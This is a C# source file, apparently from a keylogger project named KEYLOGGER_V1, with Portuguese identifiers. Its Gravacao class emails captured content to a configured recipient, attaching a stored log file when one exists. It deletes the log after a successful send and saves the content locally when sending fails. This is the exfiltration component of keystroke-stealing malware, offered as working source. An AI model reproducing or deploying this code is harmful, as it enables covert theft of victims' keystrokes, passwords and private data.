using KEYLOGGER_V1.Log;
using KEYLOGGER_V1.Email;
using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;



namespace KEYLOGGER_V1
{
    public class Gravacao
    {

        #region Construtor
        public Gravacao()
        {

        }
        #endregion

        #region Metodos
        #region metodos de Armazenamentos
        public void Armazenar(string login, string senha, string conteudo, string remetente, string destinatario, string assunto, string nomeArquivo, string dirLog)
        {

            #region Enviar email com Anexo

            LogServico logRecursos = new LogServico(dirLog);
            if (logRecursos.Contem())
            {
                //Envia log se ouver
                EmailServico emailAnexo = new EmailServico(login, senha, remetente, destinatario, assunto, conteudo, dirLog);
                if (!emailAnexo.EnviarAnexo())
                {
                    LogServico servicoLog = new LogServico(dirLog, conteudo, nomeArquivo);
                    servicoLog.Atualizar();
                }
                else
                    logRecursos.Excluir();

            }

            #endregion

            #region Enviar email sem Anexo
            else
            {
                EmailServico email = new EmailServico(login, senha, remetente, destinatario, assunto, conteudo);
                if (!email.Enviar())
                {
                    LogServico servicoLog = new LogServico(dirLog, conteudo, nomeArquivo);
                    servicoLog.Atualizar();
                }
            }
            #endregion

        }
        #endregion

        #endregion

    }
}
